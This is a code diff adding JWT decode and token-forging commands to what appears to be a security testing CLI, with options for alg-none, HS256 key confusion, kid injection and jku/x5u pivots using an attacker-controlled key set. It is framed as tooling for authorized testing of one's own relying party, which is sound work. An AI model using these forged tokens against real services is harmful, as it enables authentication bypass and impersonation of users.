@@ -288,6 +288,138 @@ def test(
     raise typer.Exit(code=asyncio.run(_go()))
 
 
+jose_app = typer.Typer(help="JOSE / JWT tooling (for use against your own RP).", no_args_is_help=True)
+app.add_typer(jose_app, name="jose")
+
+
+@jose_app.command("decode")
+def jose_decode(
+    token: Annotated[str, typer.Argument(help="Compact JWS token (3 b64url parts).")],
+) -> None:
+    """Print header and claims of a JWT without verifying."""
+    import json as _json
+
+    from .jose.verify import unsafe_decode
+
+    d = unsafe_decode(token)
+    typer.secho("header:", bold=True)
+    typer.echo(_json.dumps(d.header, indent=2))
+    typer.secho("claims:", bold=True)
+    typer.echo(_json.dumps(d.claims, indent=2))
+
+
+@jose_app.command("forge")
+def jose_forge(
+    attack: Annotated[
+        str,
+        typer.Option(
+            "--attack",
+            help="One of: alg_none, hs256_pubkey, kid_inject, jku_pivot, x5u_pivot.",
+        ),
+    ],
+    claims_json: Annotated[
+        Path | None,
+        typer.Option("--claims", help="Path to a JSON file with the token claims."),
+    ] = None,
+    from_token: Annotated[
+        str | None,
+        typer.Option("--from-token", help="Extract claims from this existing token."),
+    ] = None,
+    public_key_pem: Annotated[
+        Path | None,
+        typer.Option("--public-key-pem", help="Provider's public key PEM (hs256_pubkey)."),
+    ] = None,
+    kid: Annotated[str | None, typer.Option("--kid", help="Value for the kid header.")] = None,
+    jku: Annotated[str | None, typer.Option("--jku", help="Value for the jku header.")] = None,
+    x5u: Annotated[str | None, typer.Option("--x5u", help="Value for the x5u header.")] = None,
+    attacker_jwks_out: Annotated[
+        Path | None,
+        typer.Option(
+            "--attacker-jwks-out",
+            help="Where to write the attacker-controlled JWKS for jku/x5u pivots.",
+        ),
+    ] = None,
+) -> None:
+    """Forge a malicious JWS. Output goes to stdout.
+
+    Intended for operators to pipe into curl against their own RP/SP for
+    impact validation. Every attack is something the operator should have
+    explicit authorization for.
+    """
+    import json as _json
+
+    from .jose.forge import (
+        RSASigner,
+        forge_alg_none,
+        forge_hs256_with_pubkey,
+        forge_with_header,
+        generate_attacker_rsa,
+    )
+    from .jose.verify import unsafe_decode
+
+    if claims_json is None and from_token is None:
+        typer.secho(
+            "error: provide --claims <file> or --from-token <token>",
+            fg=typer.colors.RED,
+            err=True,
+        )
+        raise typer.Exit(code=2)
+
+    if claims_json is not None:
+        claims = _json.loads(claims_json.read_text())
+    else:
+        claims = unsafe_decode(from_token).claims  # type: ignore[arg-type]
+
+    if attack == "alg_none":
+        typer.echo(forge_alg_none(claims))
+        return
+
+    if attack == "hs256_pubkey":
+        if public_key_pem is None:
+            typer.secho(
+                "error: --public-key-pem is required for hs256_pubkey",
+                fg=typer.colors.RED,
+                err=True,
+            )
+            raise typer.Exit(code=2)
+        pem_bytes = public_key_pem.read_bytes()
+        typer.echo(forge_hs256_with_pubkey(claims, pem_bytes, kid=kid))
+        return
+
+    if attack in ("kid_inject", "jku_pivot", "x5u_pivot"):
+        priv, _pub, jwk = generate_attacker_rsa()
+        header: dict = {"alg": "RS256", "typ": "JWT"}
+        if attack == "kid_inject":
+            if kid is None:
+                typer.secho("error: --kid is required for kid_inject", fg=typer.colors.RED, err=True)
+                raise typer.Exit(code=2)
+            header["kid"] = kid
+        elif attack == "jku_pivot":
+            if jku is None:
+                typer.secho("error: --jku is required for jku_pivot", fg=typer.colors.RED, err=True)
+                raise typer.Exit(code=2)
+            header["jku"] = jku
+            header["kid"] = jwk["kid"]
+        else:  # x5u_pivot
+            if x5u is None:
+                typer.secho("error: --x5u is required for x5u_pivot", fg=typer.colors.RED, err=True)
+                raise typer.Exit(code=2)
+            header["x5u"] = x5u
+            header["kid"] = jwk["kid"]
+        typer.echo(forge_with_header(claims, header, RSASigner(priv)))
+        if attacker_jwks_out is not None:
+            attacker_jwks_out.write_text(_json.dumps({"keys": [jwk]}, indent=2))
+            typer.secho(
+                f"attacker JWKS written to {attacker_jwks_out} (serve at {jku or x5u})",
+                fg=typer.colors.YELLOW,
+                err=True,
+            )
+        return
+
+    typer.secho(f"error: unknown --attack {attack!r}", fg=typer.colors.RED, err=True)
+    raise typer.Exit(code=2)
+
+
 report_app = typer.Typer(help="Report commands.", no_args_is_help=True)
 app.add_typer(report_app, name="report")
 
